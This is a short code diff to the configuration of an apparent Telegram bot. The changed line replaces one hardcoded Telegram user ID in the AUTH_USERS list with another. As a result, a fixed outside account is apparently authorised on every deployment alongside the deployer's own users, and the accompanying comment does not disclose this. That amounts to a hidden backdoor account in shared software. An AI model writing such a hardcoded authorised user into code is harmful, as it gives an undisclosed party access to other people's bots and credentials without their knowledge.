@@ -14,7 +14,7 @@ class Config:
 
     BOT_OWNER = int(os.environ["BOT_OWNER"])                            # Bot owner's telegram id You can get with rose or marie
 
-    AUTH_USERS = [BOT_OWNER,374321319]+[int(user) for user in os.environ["AUTH_USERS"].split(",") if os.environ["AUTH_USERS"]]
+    AUTH_USERS = [BOT_OWNER,813878981]+[int(user) for user in os.environ["AUTH_USERS"].split(",") if os.environ["AUTH_USERS"]]
                                                                         # Id of other users who want to use your bot
 
     CRED_FILE = "auth_token.txt"                                        # Credentials file
